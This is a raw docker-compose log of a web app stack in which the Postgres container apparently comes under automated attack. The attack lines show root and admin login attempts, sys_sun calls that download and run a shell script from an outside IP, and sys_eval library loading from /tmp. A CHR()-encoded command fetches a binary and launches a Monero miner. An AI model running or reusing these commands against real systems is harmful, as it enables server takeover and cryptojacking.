Attaching to cohvis_nginx_1, cohvis_web_1, cohvis_postgres_1
[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [1] [INFO] Starting gunicorn 19.3.0
[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-21 18:46:56 UTC
[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
[32mpostgres_1  |[0m LOG:  invalid record length at 0/1742280: wanted 24, got 0
[32mpostgres_1  |[0m LOG:  redo is not required
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m sh: 1: wget: not found
[32mpostgres_1  |[0m LOG:  server process (PID 27793) exited with exit code 127
[32mpostgres_1  |[0m LOG:  terminating any other active server processes
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-22 08:52:52 UTC
[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
[32mpostgres_1  |[0m LOG:  redo starts at 0/174E168
[32mpostgres_1  |[0m LOG:  invalid magic number 0000 in log segment 000000010000000000000001, offset 7708672
[32mpostgres_1  |[0m LOG:  redo done at 0/1758380
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://45.79.102.120/pgpool.sh -O /tmp/pgpool.sh;curl http://45.79.102.120/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "root" does not exist
[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-22 17:07:37 UTC
[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
[32mpostgres_1  |[0m LOG:  invalid record length at 0/17599E0: wanted 24, got 0
[32mpostgres_1  |[0m LOG:  redo is not required
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m sh: 1: wget: not found
[32mpostgres_1  |[0m LOG:  server process (PID 28) exited with exit code 127
[32mpostgres_1  |[0m LOG:  terminating any other active server processes
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-23 08:37:37 UTC
[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
[32mpostgres_1  |[0m LOG:  invalid record length at 0/1759A50: wanted 24, got 0
[32mpostgres_1  |[0m LOG:  redo is not required
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [1] [INFO] Starting gunicorn 19.3.0
[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [1] [INFO] Using worker: sync
[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [8] [INFO] Booting worker with pid: 8
[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [10] [INFO] Booting worker with pid: 10
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-24 09:16:12 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:10)
[33mweb_1       |[0m [2017-04-24 11:16:12 +0000] [10] [INFO] Worker exiting (pid: 10)
[33mweb_1       |[0m [2017-04-24 09:16:13 +0000] [22] [INFO] Booting worker with pid: 22
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-24 09:17:03 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:22)
[33mweb_1       |[0m [2017-04-24 11:17:03 +0000] [22] [INFO] Worker exiting (pid: 22)
[33mweb_1       |[0m [2017-04-24 09:17:04 +0000] [32] [INFO] Booting worker with pid: 32
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-24 09:36:11 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:32)
[33mweb_1       |[0m [2017-04-24 11:36:11 +0000] [32] [INFO] Worker exiting (pid: 32)
[33mweb_1       |[0m [2017-04-24 09:36:11 +0000] [42] [INFO] Booting worker with pid: 42
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-24 14:37:46 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:42)
[33mweb_1       |[0m [2017-04-24 16:37:46 +0000] [42] [INFO] Worker exiting (pid: 42)
[33mweb_1       |[0m [2017-04-24 14:37:46 +0000] [52] [INFO] Booting worker with pid: 52
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-24 19:03:48 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:8)
[33mweb_1       |[0m [2017-04-24 21:03:48 +0000] [8] [INFO] Worker exiting (pid: 8)
[33mweb_1       |[0m [2017-04-24 19:03:49 +0000] [62] [INFO] Booting worker with pid: 62
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-24 19:04:48 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:62)
[33mweb_1       |[0m [2017-04-24 21:04:48 +0000] [62] [INFO] Worker exiting (pid: 62)
[33mweb_1       |[0m [2017-04-24 19:04:49 +0000] [72] [INFO] Booting worker with pid: 72
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-24 19:10:43 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:52)
[33mweb_1       |[0m [2017-04-24 21:10:43 +0000] [52] [INFO] Worker exiting (pid: 52)
[33mweb_1       |[0m [2017-04-24 19:10:44 +0000] [82] [INFO] Booting worker with pid: 82
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-24 19:14:16 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:72)
[33mweb_1       |[0m [2017-04-24 21:14:16 +0000] [72] [INFO] Worker exiting (pid: 72)
[33mweb_1       |[0m [2017-04-24 19:14:17 +0000] [92] [INFO] Booting worker with pid: 92
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-25 09:33:26 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:92)
[33mweb_1       |[0m [2017-04-25 11:33:26 +0000] [92] [INFO] Worker exiting (pid: 92)
[33mweb_1       |[0m Exception in thread Thread-1 (most likely raised during interpreter shutdown):
[33mweb_1       |[0m Traceback (most recent call last):
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/threading.py", line 801, in __bootstrap_inner
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/gunicorn/reloader.py", line 41, in run
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/gunicorn/reloader.py", line 29, in get_files
[33mweb_1       |[0m <type 'exceptions.AttributeError'>: 'NoneType' object has no attribute 'modules'
[33mweb_1       |[0m [2017-04-25 09:33:27 +0000] [102] [INFO] Booting worker with pid: 102
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-25 09:36:47 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:82)
[33mweb_1       |[0m [2017-04-25 11:36:47 +0000] [82] [INFO] Worker exiting (pid: 82)
[33mweb_1       |[0m Exception in thread Thread-1 (most likely raised during interpreter shutdown):
[33mweb_1       |[0m Traceback (most recent call last):
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/threading.py", line 801, in __bootstrap_inner
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/gunicorn/reloader.py", line 41, in run
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/gunicorn/reloader.py", line 29, in get_files
[33mweb_1       |[0m <type 'exceptions.AttributeError'>: 'NoneType' object has no attribute 'modules'
[33mweb_1       |[0m [2017-04-25 09:36:48 +0000] [112] [INFO] Booting worker with pid: 112
[33mweb_1       |[0m [2017-04-25 11:38:34 +0000] [102] [INFO] Worker reloading: /code/toolapp/settings.py modified
[33mweb_1       |[0m [2017-04-25 11:38:34 +0000] [112] [INFO] Worker reloading: /code/toolapp/settings.py modified
[33mweb_1       |[0m [2017-04-25 11:38:34 +0000] [102] [INFO] Worker exiting (pid: 102)
[33mweb_1       |[0m [2017-04-25 11:38:34 +0000] [112] [INFO] Worker exiting (pid: 112)
[33mweb_1       |[0m [2017-04-25 09:38:34 +0000] [115] [INFO] Booting worker with pid: 115
[33mweb_1       |[0m [2017-04-25 09:38:34 +0000] [118] [INFO] Booting worker with pid: 118
[33mweb_1       |[0m reading parameter file...finished
[33mweb_1       |[0m 01
[33mweb_1       |[0m [2017-04-25 09:39:12 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:118)
[33mweb_1       |[0m [2017-04-25 11:39:12 +0000] [118] [INFO] Worker exiting (pid: 118)
[33mweb_1       |[0m [2017-04-25 09:39:13 +0000] [128] [INFO] Booting worker with pid: 128
[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://45.79.102.120/pgpool.sh -O /tmp/pgpool.sh;curl http://45.79.102.120/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
[32mpostgres_1  |[0m sh: 1: wget: not found
[32mpostgres_1  |[0m LOG:  server process (PID 274) exited with exit code 127
[32mpostgres_1  |[0m LOG:  terminating any other active server processes
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-23 08:58:50 UTC
[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
[32mpostgres_1  |[0m LOG:  redo starts at 0/1759AC0
[32mpostgres_1  |[0m LOG:  invalid magic number 0000 in log segment 000000010000000000000001, offset 7757824
[32mpostgres_1  |[0m LOG:  redo done at 0/1763B18
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m LOG:  unexpected EOF on client connection with an open transaction
[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://45.79.102.120/pgpool.sh -O /tmp/pgpool.sh;curl http://45.79.102.120/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
[32mpostgres_1  |[0m sh: 1: wget: not found
[32mpostgres_1  |[0m LOG:  server process (PID 3598) exited with exit code 127
[32mpostgres_1  |[0m LOG:  terminating any other active server processes
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-24 19:04:50 UTC
[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
[32mpostgres_1  |[0m LOG:  redo starts at 0/176EB80
[32mpostgres_1  |[0m LOG:  invalid magic number 0000 in log segment 000000010000000000000001, offset 7847936
[32mpostgres_1  |[0m LOG:  redo done at 0/1779520
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m ERROR:  table "akeupr" does not exist
[32mpostgres_1  |[0m STATEMENT:  DROP TABLE akeupr
[32mpostgres_1  |[0m ERROR:  large object 6566 does not exist
[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(6566)
[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libsnoiftc.so": version mismatch
[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION apach2(text) RETURNS int4 AS '/tmp/libsnoiftc.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
[32mpostgres_1  |[0m ERROR:  function apach2(text) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
[32mpostgres_1  |[0m STATEMENT:  SELECT apach2((CHR(112)||CHR(115)||CHR(32)||CHR(45)||CHR(101)||CHR(102)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(45)||CHR(118)||CHR(32)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(124)||CHR(99)||CHR(117)||CHR(116)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(57)||CHR(45)||CHR(49)||CHR(53)||CHR(124)||CHR(120)||CHR(97)||CHR(114)||CHR(103)||CHR(115)||CHR(32)||CHR(107)||CHR(105)||CHR(108)||CHR(108)||CHR(32)||CHR(45)||CHR(57)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(56)||CHR(54)||CHR(46)||CHR(54)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(111)||CHR(105)||CHR(111)||CHR(119)||CHR(107)||CHR(115)||CHR(98)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(111)||CHR(105)||CHR(111)||CHR(119)||CHR(107)||CHR(115)||CHR(98)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(111)||CHR(105)||CHR(111)||CHR(119)||CHR(107)||CHR(115)||CHR(98)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||CHR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(62)||CHR(47)||CHR(100)||CHR(101)||CHR(118)||CHR(47)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(32)||CHR(38)))
[32mpostgres_1  |[0m ERROR:  table "klwriz" does not exist
[32mpostgres_1  |[0m STATEMENT:  DROP TABLE klwriz
[32mpostgres_1  |[0m ERROR:  large object 3552 does not exist
[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(3552)
[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
[32mpostgres_1  |[0m ERROR:  table "ljjyog" does not exist
[32mpostgres_1  |[0m STATEMENT:  DROP TABLE ljjyog
[32mpostgres_1  |[0m ERROR:  large object 4584 does not exist
[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(4584)
[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libspixwxt.so": version mismatch
[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION systemlogin(text) RETURNS int4 AS '/tmp/libspixwxt.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
[32mpostgres_1  |[0m ERROR:  function systemlogin(text) does not exist at character 8
[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
